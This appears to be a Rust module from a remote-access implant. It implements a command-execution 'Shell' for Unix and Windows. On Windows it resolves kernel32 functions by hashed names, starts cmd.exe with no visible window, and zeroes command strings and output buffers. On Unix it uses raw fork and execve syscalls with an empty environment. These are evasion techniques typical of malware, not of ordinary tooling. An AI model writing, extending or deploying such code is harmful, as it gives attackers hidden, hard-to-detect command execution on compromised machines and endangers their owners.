use crate::utils::sensitive::SensitiveData;
use alloc::vec::Vec;
use zeroize::Zeroize;

#[cfg(not(target_os = "windows"))]
use crate::utils::syscalls::{
    sys_close, sys_dup2, sys_execve, sys_exit, sys_fork, sys_pipe, sys_read,
};

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct Shell;

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct STARTUPINFOA {
    cb: u32,
    lpReserved: PVOID,
    lpDesktop: PVOID,
    lpTitle: PVOID,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct PROCESS_INFORMATION {
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: u32,
    dwThreadId: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct SECURITY_ATTRIBUTES {
    nLength: u32,
    lpSecurityDescriptor: PVOID,
    bInheritHandle: i32,
}

impl Shell {
    pub fn exec(&self, cmd: &str) -> SensitiveData {
        #[cfg(not(target_os = "windows"))]
        unsafe {
            let mut pipefd = [0i32; 2];
            if sys_pipe(pipefd.as_mut_ptr()) < 0 {
                return SensitiveData::new(b"Pipe failed");
            }

            let pid = sys_fork();
            if pid < 0 {
                return SensitiveData::new(b"Fork failed");
            }

            if pid == 0 {
                // Child
                sys_close(pipefd[0] as usize);
                sys_dup2(pipefd[1], 1);
                sys_dup2(pipefd[1], 2);

                let sh = b"/bin/sh\0";
                let arg1 = b"-c\0";
                let mut cmd_c = Vec::from(cmd.as_bytes());
                cmd_c.push(0);

                let argv = [
                    sh.as_ptr(),
                    arg1.as_ptr(),
                    cmd_c.as_ptr(),
                    core::ptr::null(),
                ];
                let envp = [core::ptr::null()];

                sys_execve(sh.as_ptr(), argv.as_ptr(), envp.as_ptr());
                cmd_c.zeroize(); // Only reached if execve fails
                sys_exit(1);
            } else {
                // Parent
                sys_close(pipefd[1] as usize);
                let mut output = Vec::new();
                let mut buf = [0u8; 4096];
                loop {
                    let n = sys_read(pipefd[0] as usize, buf.as_mut_ptr(), 4096);
                    if n as isize <= 0 {
                        break;
                    }
                    output.extend_from_slice(&buf[..n]);
                }
                sys_close(pipefd[0] as usize);

                let sensitive = SensitiveData::new(&output);
                output.zeroize();
                buf.zeroize();
                sensitive
            }
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_pipe = resolve_function(kernel32, hash_str(b"CreatePipe"));
            let set_handle_info = resolve_function(kernel32, hash_str(b"SetHandleInformation"));
            let create_process = resolve_function(kernel32, hash_str(b"CreateProcessA"));
            let read_file = resolve_function(kernel32, hash_str(b"ReadFile"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));

            if create_pipe.is_null() || create_process.is_null() || read_file.is_null() {
                return SensitiveData::new(b"Resolution failed");
            }

            type FnCreatePipe = unsafe extern "system" fn(
                *mut HANDLE,
                *mut HANDLE,
                *mut SECURITY_ATTRIBUTES,
                u32,
            ) -> i32;
            type FnSetHandleInfo = unsafe extern "system" fn(HANDLE, u32, u32) -> i32;
            type FnCreateProcessA = unsafe extern "system" fn(
                LPCSTR,
                *mut u8,
                PVOID,
                PVOID,
                i32,
                u32,
                PVOID,
                LPCSTR,
                *mut STARTUPINFOA,
                *mut PROCESS_INFORMATION,
            ) -> i32;
            type FnReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32, PVOID) -> i32;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let mut sa = SECURITY_ATTRIBUTES {
                nLength: core::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
                lpSecurityDescriptor: core::ptr::null_mut(),
                bInheritHandle: 1,
            };

            let mut h_read: HANDLE = core::ptr::null_mut();
            let mut h_write: HANDLE = core::ptr::null_mut();

            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(
                &mut h_read,
                &mut h_write,
                &mut sa,
                0,
            ) == 0
            {
                return SensitiveData::new(b"Pipe creation failed");
            }

            // Ensure the read handle to the pipe for the child process is not inherited.
            // HANDLE_FLAG_INHERIT = 0x1
            core::mem::transmute::<_, FnSetHandleInfo>(set_handle_info)(h_read, 0x1, 0);

            let mut si: STARTUPINFOA = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
            si.hStdError = h_write;
            si.hStdOutput = h_write;
            // STARTF_USESTDHANDLES = 0x100
            si.dwFlags = 0x100;

            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            let mut cmd_mut = Vec::from(b"cmd.exe /c ");
            cmd_mut.extend_from_slice(cmd.as_bytes());
            cmd_mut.push(0);

            // CREATE_NO_WINDOW = 0x08000000
            let success = core::mem::transmute::<_, FnCreateProcessA>(create_process)(
                core::ptr::null(),
                cmd_mut.as_mut_ptr(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                1,
                0x08000000,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut si,
                &mut pi,
            );

            cmd_mut.zeroize();

            if success == 0 {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);
                return SensitiveData::new(b"Process creation failed");
            }

            // Close the write end of the pipe before reading from the read end.
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);

            let mut output = Vec::new();
            let mut buf = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                if core::mem::transmute::<_, FnReadFile>(read_file)(
                    h_read,
                    buf.as_mut_ptr() as PVOID,
                    4096,
                    &mut bytes_read,
                    core::ptr::null_mut(),
                ) == 0
                    || bytes_read == 0
                {
                    break;
                }
                output.extend_from_slice(&buf[..bytes_read as usize]);
            }

            buf.zeroize();

            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(pi.hProcess);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(pi.hThread);

            let sensitive = SensitiveData::new(&output);
            output.zeroize();
            sensitive
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell_init() {
        let _shell = Shell;
    }
}
